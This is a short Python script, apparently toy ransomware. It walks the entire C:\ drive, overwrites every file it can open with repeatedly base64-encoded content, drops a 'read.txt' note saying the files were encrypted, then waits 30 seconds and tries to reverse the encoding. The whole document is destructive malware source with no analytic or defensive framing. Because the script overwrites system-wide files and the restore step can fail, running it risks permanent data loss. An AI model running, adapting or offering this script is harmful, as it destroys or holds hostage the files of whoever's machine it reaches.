import os
import base64
import random
import time

def Encrypt():
    for root, dirs, files in os.walk('C:\\'):
        for file in files:
            if file != 'read.txt':
                filepath = os.path.join(root, file)
                try:
                    with open(filepath, 'rb') as f:
                        initcont = f.read()
                        encodedstr = base64.b64encode(initcont)
                        for i in range(key):
                            encodedstr = base64.b64encode(encodedstr)
                        with open(filepath, 'wb') as fw:
                            fw.write(encodedstr)
                except (PermissionError, IsADirectoryError):
                    pass
    with open('read.txt', 'w+') as note:
        note.write('I encrypted your files >:3')

def Decrypt():
    for root, dirs, files in os.walk('C:\\'):
        for file in files:
            if file != 'read.txt':
                filepath = os.path.join(root, file)
                try:
                    with open(filepath, 'rb') as f:
                        encrypcont = f.read()
                        decodedstr = base64.b64decode(encrypcont)
                        for i in range(key):
                            decodedstr = base64.b64decode(decodedstr)
                        with open(filepath, 'wb') as fw:
                            fw.write(decodedstr)
                except (PermissionError, IsADirectoryError):
                    pass

key = random.randint(0, 5)
Encrypt()
time.sleep(30)
Decrypt()
